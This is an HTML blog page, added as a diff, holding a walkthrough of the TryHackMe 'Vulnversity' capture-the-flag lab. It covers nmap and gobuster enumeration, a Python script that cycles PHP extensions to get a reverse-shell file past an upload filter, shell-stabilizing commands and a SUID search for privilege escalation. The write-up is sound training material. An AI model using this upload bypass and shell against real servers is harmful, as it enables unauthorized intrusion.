@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head prefix="og: https://ogp.me/ns#">
+    <meta charset="utf-8" />
+    <meta name="generator" content="gh:importantimport/urara" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="manifest" crossorigin="use-credentials" href="/manifest.webmanifest" />
+    <link rel="alternate" type="application/feed+json" href="/feed.json" />
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml" />
+    <link rel="sitemap" type="application/xml" href="/sitemap.xml" />
+    <meta http-equiv="content-security-policy" content="">
+		<link href="../../_app/immutable/assets/_layout-fe75ebb9.css" rel="stylesheet">
+		<link rel="modulepreload" href="../../_app/immutable/start-a3379301.js">
+		<link rel="modulepreload" href="../../_app/immutable/chunks/index-9671d79c.js">
+		<link rel="modulepreload" href="../../_app/immutable/chunks/singletons-626dbfc1.js">
+		<link rel="modulepreload" href="../../_app/immutable/chunks/preload-helper-41c905a7.js">
+		<link rel="modulepreload" href="../../_app/immutable/components/pages/_layout.svelte-da06c61a.js">
+		<link rel="modulepreload" href="../../_app/immutable/chunks/title-4a6e1efe.js">
+		<link rel="modulepreload" href="../../_app/immutable/chunks/posts-46a83d82.js">
+		<link rel="modulepreload" href="../../_app/immutable/chunks/icon-4e04760f.js">
+		<link rel="modulepreload" href="../../_app/immutable/modules/pages/_layout.ts-495f1f70.js">
+		<link rel="modulepreload" href="../../_app/immutable/chunks/_layout-d091a1a0.js">
+		<link rel="modulepreload" href="../../_app/immutable/components/pages/TryHackme/Vulnversity/_page.svelte.md-8e1e50c4.js">
+		<link rel="modulepreload" href="../../_app/immutable/chunks/post_layout-76c250d8.js">
+		<link rel="modulepreload" href="../../_app/immutable/chunks/post_card-ea1dea7e.js">
+		<link rel="modulepreload" href="../../_app/immutable/chunks/footer-869f717b.js"><title>TryHackMe Vulnversity | Home</title><!-- HEAD_svelte-1592q3p_START --><!-- HEAD_svelte-1592q3p_END --><!-- HEAD_svelte-1kxdj3d_START --><link rel="shortcut icon" href="https://urara-demo.netlify.app/favicon.png" sizes="48x48" type="image/png"><link rel="apple-touch-icon" href="https://urara-demo.netlify.app/assets/any@180.png" sizes="180x180" type="image/png"><link rel="icon" href="https://urara-demo.netlify.app/assets/any@192.png" sizes="192x192" type="image/png"><!-- HEAD_svelte-1kxdj3d_END --><!-- HEAD_svelte-1g590ms_START --><meta name="theme-color"><!-- HEAD_svelte-1g590ms_END --><!-- HEAD_svelte-abrfj_START --><meta name="author" content="Saikat Karmakar"><link rel="canonical" href="https://urara-demo.netlify.app/TryHackme/Vulnversity">
+    
+    <meta name="keywords" content="tryhackme, ctf, file upload">
+    <!-- HEAD_svelte-abrfj_END --><!-- HEAD_svelte-1y1uq0g_START --><meta property="og:site_name" content="Home"><meta property="og:locale" content="en-US"><meta property="og:type" content="article">
+    <meta property="og:title" content="TryHackMe Vulnversity">
+    
+    <meta property="og:image" content="https://urara-demo.netlify.apphttps://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/11.png">
+      <meta name="twitter:card" content="summary_large_image">
+    <meta property="article:tag" content="tryhackme"><meta property="article:tag" content="ctf"><meta property="article:tag" content="file upload">
+    <meta property="og:url" content="https://urara-demo.netlify.app/TryHackme/Vulnversity">
+    <meta property="article:author" content="Saikat Karmakar">
+    <meta property="article:published_time" content="2021-08-09T00:00:00.000Z">
+    <meta property="article:modified_time" content="2022-12-19T00:00:00.000Z"><!-- HEAD_svelte-1y1uq0g_END -->
+  </head>
+  <body itemscope itemtype="https://schema.org/WebPage">
+    
+
+
+
+
+
+
+
+
+
+
+<header id="header" class="fixed z-50 w-screen transition-all duration-500 ease-in-out border-b-2 border-transparent max-h-[4.125rem] false"><div class="navbar"><div class="navbar-start">
+
+<div class="dropdown lg:hidden"><label for="navbar-dropdown" tabindex="0" class="btn btn-square btn-ghost"><span class="i-heroicons-outline-menu-alt-1"></span></label>
+  <ul id="navbar-dropdown" tabindex="0" class="menu menu-compact dropdown-content bg-base-100 text-base-content shadow-lg rounded-box min-w-max max-w-52 p-2"><li><a data-sveltekit-prefetch href="/Welcome Web3">Welcome Web3 Writeup</a>
+        </li><li><a data-sveltekit-prefetch href="/Yogosha Christmans CTF 21">Yogosha Christmans CTF 21</a>
+        </li></ul></div>
+<div class="swap order-last hidden lg:inline-grid"><button class="swap-on btn btn-ghost text-base font-normal normal-case transition-all duration-200 hidden"></button>
+  <ul class="swap-off menu menu-horizontal p-0"><li><a data-sveltekit-prefetch class="!rounded-btn" href="/Welcome Web3">Welcome Web3 Writeup</a>
+        </li><li><a data-sveltekit-prefetch class="!rounded-btn" href="/Yogosha Christmans CTF 21">Yogosha Christmans CTF 21</a>
+        </li></ul></div>
+        <a href="/" data-sveltekit-prefetch class="btn btn-ghost normal-case text-lg">Home</a></div>
+      <div class="navbar-end">
+        <div id="change-theme" class="dropdown dropdown-end"><div tabindex="0" class="btn btn-square btn-ghost"><span class="i-heroicons-outline-color-swatch"></span></div>
+          <ul tabindex="0" class="flex flex-nowrap shadow-2xl menu dropdown-content bg-base-100 text-base-content rounded-box w-52 p-2 gap-2 overflow-y-auto max-h-[21.5rem]"><button data-theme="cmyk" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🖨 Light</p>
+                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
+                  <div class="bg-secondary w-2 h-4 rounded"></div>
+                  <div class="bg-accent w-2 h-4 rounded"></div>
+                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
+              </button><button data-theme="dracula" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🧛 Dark</p>
+                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
+                  <div class="bg-secondary w-2 h-4 rounded"></div>
+                  <div class="bg-accent w-2 h-4 rounded"></div>
+                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
+              </button><button data-theme="valentine" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🌸 Valentine</p>
+                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
+                  <div class="bg-secondary w-2 h-4 rounded"></div>
+                  <div class="bg-accent w-2 h-4 rounded"></div>
+                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
+              </button><button data-theme="aqua" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">💦 Aqua</p>
+                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
+                  <div class="bg-secondary w-2 h-4 rounded"></div>
+                  <div class="bg-accent w-2 h-4 rounded"></div>
+                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
+              </button><button data-theme="synthwave" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🌃 Synthwave</p>
+                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
+                  <div class="bg-secondary w-2 h-4 rounded"></div>
+                  <div class="bg-accent w-2 h-4 rounded"></div>
+                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
+              </button><button data-theme="night" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🌃 Night</p>
+                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
+                  <div class="bg-secondary w-2 h-4 rounded"></div>
+                  <div class="bg-accent w-2 h-4 rounded"></div>
+                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
+              </button><button data-theme="lofi" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🎶 Lo-Fi</p>
+                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
+                  <div class="bg-secondary w-2 h-4 rounded"></div>
+                  <div class="bg-accent w-2 h-4 rounded"></div>
+                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
+              </button><button data-theme="lemonade" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🍋 Lemonade</p>
+                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
+                  <div class="bg-secondary w-2 h-4 rounded"></div>
+                  <div class="bg-accent w-2 h-4 rounded"></div>
+                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
+              </button><button data-theme="cupcake" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🧁 Cupcake</p>
+                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
+                  <div class="bg-secondary w-2 h-4 rounded"></div>
+                  <div class="bg-accent w-2 h-4 rounded"></div>
+                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
+              </button><button data-theme="garden" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🏡 Garden</p>
+                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
+                  <div class="bg-secondary w-2 h-4 rounded"></div>
+                  <div class="bg-accent w-2 h-4 rounded"></div>
+                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
+              </button><button data-theme="retro" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🌇 Retro</p>
+                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
+                  <div class="bg-secondary w-2 h-4 rounded"></div>
+                  <div class="bg-accent w-2 h-4 rounded"></div>
+                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
+              </button><button data-theme="black" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🖤 Black</p>
+                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
+                  <div class="bg-secondary w-2 h-4 rounded"></div>
+                  <div class="bg-accent w-2 h-4 rounded"></div>
+                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
+              </button></ul></div></div></div></header>
+
+<button id="totop" aria-label="scroll to top" class="fixed grid group btn btn-circle btn-lg border-none backdrop-blur bottom-6 right-6 z-50 duration-500 ease-in-out btn-ghost bg-base-100/30 md:bg-base-200/30 translate-y-24"><div class="radial-progress text-accent transition-all duration-500 ease-in-out group-hover:text-accent-focus col-start-1 row-start-1" style="--size:4rem; --thickness: 0.25rem; --value:undefined;"></div>
+  <div class="border-4 border-base-content/10 group-hover:border-transparent col-start-1 row-start-1 rounded-full w-full h-full p-4 grid duration-500 ease-in-out"><span class="i-heroicons-solid-chevron-up !w-6 !h-6"></span></div></button>
+
+<div class="bg-base-100 md:bg-base-200 min-h-screen pt-16 md:pb-8 lg:pb-16">
+
+
+
+<div class="flex flex-col flex-nowrap justify-center xl:flex-row xl:flex-wrap"><div class="flex-1 w-full max-w-screen-md order-first ease-out transform mx-auto xl:mr-0"></div>
+  <div class="flex-1 w-full max-w-screen-md xl:order-last ease-out transform mx-auto xl:mr-0"></div>
+  <div class="flex-none w-full max-w-screen-md mx-auto xl:mx-0"><article itemscope itemtype="https://schema.org/BlogPosting" itemprop="blogPost" class="h-entry card bg-base-100 rounded-none md:rounded-box md:shadow-xl overflow-hidden z-10 md:mb-8 lg:mb-16">
+  
+  
+  <div class="card-body gap-0 "><div class="flex flex-col gap-2"><figure class="md:order-last rounded-box shadow-xl mb-4 flex-col gap-2 -mx-4 -mt-8 md:mt-0"><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/11.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/11.png" class="u-featured" loading="lazy" decoding="async"></figure>
+      <div class="flex font-semibold gap-1.5"><a rel="author" class="opacity-75 hover:opacity-100 hover:text-primary duration-500 ease-in-out p-author h-card" href="https://urara-demo.netlify.app">Saikat Karmakar</a>
+  <span class="opacity-50">/</span>
+  <a href="/TryHackme/Vulnversity" class="u-url u-uid swap group/time"><time class="group-hover/time:opacity-0 font-semibold opacity-75 duration-500 ease-in-out mr-auto dt-published" datetime="2021-08-09T00:00:00.000Z" itemprop="datePublished">Monday, Aug 9, 2021</time>
+    <time class="opacity-0 group-hover/time:opacity-100 font-semibold text-primary duration-500 ease-in-out mr-auto dt-updated" datetime="2022-12-19T00:00:00.000Z" itemprop="dateModified">Monday, Dec 19, 2022</time></a></div>
+      <h1 itemprop="name headline" class="card-title text-3xl mb-8 p-name">TryHackMe Vulnversity</h1>
+      </div>
+    <main itemprop="articleBody" class="urara-prose prose e-content"><p>This a walk-through of TryHackme room <a href="https://tryhackme.com/room/vulnversity" rel="nofollow noopener noreferrer external" target="_blank">Vulnversity</a>. As always we start with the enumeration using nmap. </p>
+<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">nmap -sC -sV -A -T4 -v -oN scan/nmap 10.10.104.250 -Pn</span></div></code></div></pre><!-- HTML_TAG_END -->
+<ul><li>Let’s break it down <ul><li><code>-sC</code> for default scripts</li>
+<li><code>-sV</code> service version of the services running </li>
+<li><code>-A</code> aggresive scan</li>
+<li><code>-T4</code> speed of the scan</li>
+<li><code>-v</code> for verbosity </li>
+<li><code>-oN</code> save the output to a normal file</li>
+<li><code>-Pn</code> don’t ping the target assuming the host is live  </li></ul></li></ul>
+<ul><li><strong><em>Enumeration</em></strong></li>
+<li><img src="/assets/nmap_thm.png" alt="/assets/nmap_thm.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul>
+<h6 id="task-2"><a href="#task-2">Task 2</a></h6>
+<ul><li>So we can see there are 6 ports open; <code>21, 22, 139, 445, 3128, 3333</code></li>
+<li>Due to running a service version scan (<code>-sV</code>) we can see the version of the squid proxy running on port 3128<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/13.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/13.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li>
+<li>The <code>-p-400</code> will run a scan on the first <code>400</code> ports <ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/14.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/14.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li>
+<li>The <code>-n</code> will not resolve <code>DNS</code><ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/15.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/15.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li>
+<li>By the http banner we can see the system is running <code>Ubuntu</code>. We can also user the <code>-O</code> option to do OS detection <ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/16.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/16.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li>
+<li>The web-server is running on <code>3333</code><ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/17.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/17.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li></ul>
+<h6 id="task-3"><a href="#task-3">Task 3</a></h6>
+<p>For this section we will use the tool <code>gobuster</code>.</p>
+<p>GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.</p>
+<p>Download GoBuster <a href="https://github.com/OJ/gobuster" rel="nofollow noopener noreferrer external" target="_blank">here</a>, or if you’re on Kali Linux 2020.1+ run <code>sudo apt-get install gobuster</code></p>
+<ul><li>Let’s start the directory listing. </li></ul>
+<p><code>gobuster dir -u http://10.10.104.250:3333 -w /usr/share/wordlists/dirb/big.txt -t 50</code></p>
+<ul><li>Break down<ul><li><code>dir</code> to let gobuster know we’re doing directory brute-forcing </li>
+<li><code>-u</code> to specify the url </li>
+<li><code>-w</code> to specify the wordlist </li>
+<li><code>-t</code> to specify threads(speed). I found 50 works well. Anything more than 60 gives errors.</li></ul></li>
+<li>If you still get errors you can remove them by using <code>2&gt;/dev/null</code> which will redirect the errors to <code>/dev/null</code> dir which is practically no-where. The command will look like this </li></ul>
+<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">gobuster dir -u http://10.10.104.250:3333 -w /usr/share/wordlists/dirb/big.txt -t 50 </span><span style="color: #89DDFF">2&gt;</span><span style="color: #EEFFFF">/dev/null </span><span style="color: #89DDFF">|</span><span style="color: #EEFFFF"> tee gobuster.log</span></div><div class='line'></div></code></div></pre><!-- HTML_TAG_END -->
+<ul><li><p>Using tee to save the output only. I personally don’t like the <code>-o</code> option which gobuster provides </p></li>
+<li><p>We can see there is a <code>internal</code> dir gobuster found </p>
+<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/18.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/18.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li>
+<li>Navigating to this dir we can see there is a upload form</li>
+<li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/19.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/19.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li></ul>
+<h6 id="task-4"><a href="#task-4">Task 4</a></h6>
+<ul><li>Let’s see what we can do with it. At first we should see what files we are allowed upload. I tried uploading a jpg file <ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/110.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/110.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li>
+<li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/111.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/111.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li>
+<li>It’s not allowed. We can try uploading a php file. See if we can get the php info<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/112.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/112.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li>
+<li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/113.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/113.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li>
+<li>We can’t upload any php file. If we do this manually it’ll take unnecessary time &amp; effort. Let’s automate this process. First we have to see how the file upload is working. We can use burp or simply the network tab of our browser. We can use burp to check which extension will not be blocked. But I’ll write a simple python script to do this.</li></ul>
+<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #546E7A">#!/usr/bin/python3</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> requests</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> os </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> rename</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">ip </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">10.10.104.250</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">url </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"http://</span><span style="color: #EEFFFF">&#123;ip&#125;</span><span style="color: #C3E88D">:3333/internal/index.php"</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">extensions </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">.php</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">.php3</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">.php4</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">.php5</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">.php6</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">.phtml</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">]</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">old_file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">shell.php</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">file_name </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">shell</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">for</span><span style="color: #EEFFFF"> ext </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> extensions</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">	new_file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> file_name </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> ext</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #546E7A">#print(file)</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #82AAFF">rename</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">old_file</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> new_file</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">	files </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">file</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">open</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">new_file</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">rb</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)&#125;</span></div><div class='line'><span style="color: #EEFFFF">	r </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> requests</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">files</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">files</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #546E7A">#print(r.text)	</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Extension not allowed</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> r</span><span style="color: #89DDFF">.</span><span style="color: #F07178">text</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">		</span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #82AAFF">&#123;ext&#125;</span><span style="color: #C3E88D"> not allowed"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #89DDFF">else</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">		</span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #82AAFF">&#123;ext&#125;</span><span style="color: #C3E88D"> allowed!!"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">		</span><span style="color: #89DDFF">break</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">	old_file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> new_file</span></div><div class='line'></div></code></div></pre><!-- HTML_TAG_END -->
+<ul><li>So this script is basically going through each extension of the extensions list &amp; checking if the file extension is allowed or not &amp; renaming it then sending the file to the web-server using the requests module. So we can the <code>.phtml</code> is allowed<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/114.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/114.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li>
+<li>Rev-shell time. I’m using the one which comes default with kali(pentestmoney).In the shell we have to change these 2 variables<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/115.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/115.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li>
+<li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/116.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/116.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li>
+<li>Success. Next setup a netcat listener &amp; navigate to the file on the server.<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/117.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/117.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li>
+<li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/118.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/118.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li>
+<li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/119.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/119.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li>
+<li>We got the shell but it’s limited. We have to stabilize it.</li></ul>
+<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div><div class='line'><span style="color: undefined">export TERM=xterm</span></div><div class='line'><span style="color: undefined">Ctrl + Z</span></div><div class='line'><span style="color: undefined">stty raw -echo; fg</span></div></code></div></pre><!-- HTML_TAG_END -->
+<ul><li>We got the user flag. User is <code>Bill</code><ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/120.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/120.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li></ul>
+<h6 id="task-5"><a href="#task-5">Task 5</a></h6>
+<ul><li><p>Now Privilege Escalation. As this task suggests we’re gonna search for <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/" rel="nofollow noopener noreferrer external" target="_blank">SUID binaries</a></p></li>
+<li><p>Search for SUID bits on the machine <code>find / -perm -u=s -type f 2&gt;/dev/null</code></p></li>
+<li><p>There is an unusual binary here</p>
+<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/121.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/121.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li>
+<li><p><a href="https://gtfobins.github.io/#" rel="nofollow noopener noreferrer external" target="_blank">GTFO bins</a> is the goto for any kind of binary based Privilege Escalation.</p>
